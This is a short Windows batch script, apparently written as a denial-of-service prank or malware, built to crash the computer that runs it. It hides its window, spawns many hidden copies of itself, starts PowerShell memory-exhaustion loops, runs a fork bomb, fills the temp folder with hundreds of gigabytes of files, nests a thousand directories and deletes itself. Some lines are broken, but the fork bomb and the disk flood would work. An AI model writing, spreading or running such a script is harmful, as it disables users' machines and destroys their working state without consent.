@echo off
cd /d %TEMP%
setlocal enabledelayedexpansion

:: Self-hide
>nul 2>&1 (
  powershell -Command "$w = Get-ConsoleWindow; ShowWindow($w, 0)"
)

:: CPU Overload (Infinite loop)
for /l %%x in (1, 1, 100) do (
  start /min wscript //e:JScript "%~f0"
)

:: RAM Allocation via PowerShell
for /l %%m in (1, 1, 50) do (
  start /min powershell -Command "$a='A'*100MB; while(1){$a+=$a}"
)

:: Fork Bomb
:fork
start "" "%~f0"
goto fork

:: Disk I/O Flood
:disk
for /l %%d in (1, 1, 1000) do (
  fsutil file createnew "%TEMP%\crashfile%%d.tmp" 268435456 >nul
)

:: Deep Filesystem Nesting
set "deep=%TEMP%\x"
md "!deep!"
cd /d "!deep!"
for /l %%i in (1, 1, 1000) do (
  md %%i
  cd %%i
  echo crash>crash.txt
)

:: Self-delete
(del "%~f0") >nul 2>&1

exit
